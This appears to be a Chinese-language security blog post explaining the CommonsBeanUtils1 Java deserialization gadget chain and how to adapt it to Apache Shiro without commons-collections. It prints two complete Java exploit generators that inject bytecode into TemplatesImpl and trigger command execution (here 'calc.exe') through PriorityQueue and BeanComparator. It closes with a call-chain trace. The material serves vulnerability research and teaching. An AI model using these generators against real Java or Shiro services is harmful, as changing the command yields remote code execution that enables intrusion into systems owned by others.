---
created: '21/11/16'
title: 反序列化之CommonsBeanUtils1
tags:
  - java
  - java安全
  - 反序列化
---
# 反序列化之CommonsBeanUtils1
CommonsBeanUtils1的后半段还是我们熟悉的老朋友`TemplatesImpl`，只要触发到其`newTransformer`方法，后面的链就和CC2之类的一样了，而CB1触发`newTransformer`的方法是`getOutputProperties`，所以CommonsBeanUtils的前半段主要是围绕如何通过readObject触发getter方法展开

参考文章: [CommonsBeanutils与无commons-collections的Shiro反序列化利用](https://www.leavesongs.com/PENETRATION/commons-beanutils-without-commons-collections.html)

## 了解Apache Commons Beanutils
> Apache Commons Beanutils 是 Apache Commons 工具集下的另一个项目，它提供了对普通Java类对象（也称为JavaBean）的一些操作方法。
> JavaBean实际上就是一个类的写法规范，其一个特征是类中所有属性都是私有的，通过setter和getter方法来设置和获取属性

比如以下一个`Cat`类:
```java
final public class Cat {
    private String name = "catalina";

    public String getName() {
        return name;
    }

    public void setName(String name) {
        this.name = name;
    }
}
```
> 它包含一个私有属性name，和读取和设置这个属性的两个方法，又称为getter和setter。其中，getter的方法名以get开头，setter的方法名以set开头，全名符合骆驼式命名法（Camel-Case）。
commons-beanutils中提供了一个静态方法PropertyUtils.getProperty，让使用者可以直接调用任意JavaBean的getter方法，比如：
PropertyUtils.getProperty(new Cat(), "name");

## 主角登场: BeanComparator
这个是`CommonsBeanUtils`中的一个比较类，其`compare`方法很有意思，会调用`PropertyUtils.getProperty`方法:
```java
public int compare( final T o1, final T o2 ) {

    if ( property == null ) {
        // compare the actual objects
        return internalCompare( o1, o2 );
    }

    try {
        final Object value1 = PropertyUtils.getProperty( o1, property );
        final Object value2 = PropertyUtils.getProperty( o2, property );
        return internalCompare( value1, value2 );
    }
    catch ( final IllegalAccessException iae ) {
        throw new RuntimeException( "IllegalAccessException: " + iae.toString() );
    }
    catch ( final InvocationTargetException ite ) {
        throw new RuntimeException( "InvocationTargetException: " + ite.toString() );
    }
    catch ( final NoSuchMethodException nsme ) {
        throw new RuntimeException( "NoSuchMethodException: " + nsme.toString() );
    }
}
```
根据之前的学习我们知道CC2链中入口是以PriorityQueue，主要的承接方法就是某个Comparer的`compare`方法，所以我们可以使用这个`BeanComparer`构造出新的链:
```java
package top.longlone;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.beanutils.BeanComparator;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

public class CB1 {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static TemplatesImpl generateTemplates(String code) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass cc = pool.makeClass("Cat");
        // 创建 static 代码块，并插入代码
        cc.makeClassInitializer().insertBefore(code);
        String randomClassName = "EvilCat" + System.nanoTime();
        cc.setName(randomClassName);
        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));
        // 转换为bytes
        byte[] classBytes = cc.toBytecode();
        return newTemplatesWithClassBytes(classBytes);
    }

    private static TemplatesImpl newTemplatesWithClassBytes(byte[] classBytes) throws Exception {
        TemplatesImpl templates = TemplatesImpl.class.newInstance();
        setFieldValue(templates, "_bytecodes", new byte[][]{classBytes});
        // 进入 defineTransletClasses() 方法需要的条件
        setFieldValue(templates, "_name", "name" + System.nanoTime());
        setFieldValue(templates, "_class", null);
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
        return templates;
    }



    public static byte[] getPayload() throws Exception {
        TemplatesImpl obj = generateTemplates("java.lang.Runtime.getRuntime().exec(\"calc.exe\");");

        final BeanComparator comparator = new BeanComparator();
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        // stub data for replacement later
        queue.add("1");
        queue.add("1");

        setFieldValue(comparator, "property", "outputProperties");
        setFieldValue(queue, "queue", new Object[]{obj, obj});

        // ==================
        // 生成序列化字符串
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(queue);
        oos.close();

        return barr.toByteArray();
    }

    public static void main(String[] args) throws Exception {
        byte[] payload = getPayload();

        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(payload));
        ois.readObject();
    }
}
```


## 在shiro下利用的坑点
1. Shiro中自带的commons-beanutils与我们本地的版本不一致，就可能在反序列化时出现serialVersionUID对应不上的问题
2. commons-beanutils本来依赖于commons-collections，但是在Shiro中，它的commons-beanutils虽然包含了一部分commons-collections的类，但却不全。这也导致，正常使用Shiro的时候不需要依赖于commons-collections，但反序列化利用的时候需要依赖于commons-collections。

### 解决第一个坑点
解决第一个坑点很简单，将依赖版本替换就可以，还有一种方式是通过自定义ClassLoader来做隔离

### 解决第二个坑点
我们来看看我们这条链究竟是哪里用到了commons-collections的依赖:
![](https://tuchuang-1300339532.cos.ap-chengdu.myqcloud.com/img/20211116190140.png)
当我们没有提供comparator时，他会使用commons-collections的Comparator。为了解决这个问题，我们需要寻找一个新的Comparator，它要满足以下条件:
-   实现`java.util.Comparator`接口
-   实现`java.io.Serializable`接口
-   Java、shiro或commons-beanutils自带，且兼容性强

结合参考文章，我们找到了CaseInsensitiveComparator这个类，同时我们可以很简单地通过`String.CASE_INSENSITIVE_ORDER`拿到上下文中的`CaseInsensitiveComparator`对象:
![](https://tuchuang-1300339532.cos.ap-chengdu.myqcloud.com/img/20211116190403.png)
将链稍作修改，修改BeanComparator的实例化参数，即可成功在shiro中执行任意代码:
```java
package top.longlone;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.beanutils.BeanComparator;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

public class CB1 {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static TemplatesImpl generateTemplates(String code) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass cc = pool.makeClass("Cat");
        // 创建 static 代码块，并插入代码
        cc.makeClassInitializer().insertBefore(code);
        String randomClassName = "EvilCat" + System.nanoTime();
        cc.setName(randomClassName);
        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));
        // 转换为bytes
        byte[] classBytes = cc.toBytecode();
        return newTemplatesWithClassBytes(classBytes);
    }

    private static TemplatesImpl newTemplatesWithClassBytes(byte[] classBytes) throws Exception {
        TemplatesImpl templates = TemplatesImpl.class.newInstance();
        setFieldValue(templates, "_bytecodes", new byte[][]{classBytes});
        // 进入 defineTransletClasses() 方法需要的条件
        setFieldValue(templates, "_name", "name" + System.nanoTime());
        setFieldValue(templates, "_class", null);
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
        return templates;
    }



    public static byte[] getPayload() throws Exception {
        TemplatesImpl obj = generateTemplates("java.lang.Runtime.getRuntime().exec(\"calc.exe\");");

        final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        // stub data for replacement later
        queue.add("1");
        queue.add("1");

        setFieldValue(comparator, "property", "outputProperties");
        setFieldValue(queue, "queue", new Object[]{obj, obj});

        // ==================
        // 生成序列化字符串
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(queue);
        oos.close();

        return barr.toByteArray();
    }

    public static void main(String[] args) throws Exception {
        byte[] payload = getPayload();

        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(payload));
        ois.readObject();
    }
}
```

## 调用逻辑
```
PriorityQueue.readObject()
  PriorityQueue.heapify()
  PriorityQueue.siftDown()
  PriorityQueue.siftDownUsingComparator()
  comparator.compare() === BeanComparator.compare()
    TemplatesImpl.getOutputProperties()
      TemplatesImpl.newTransformer()
        TemplatesImpl.getTransletInstance() 
          TemplatesImpl.defineTransletClasses()  // 定义类
        ...  // 创建类实例，触发static代码块
```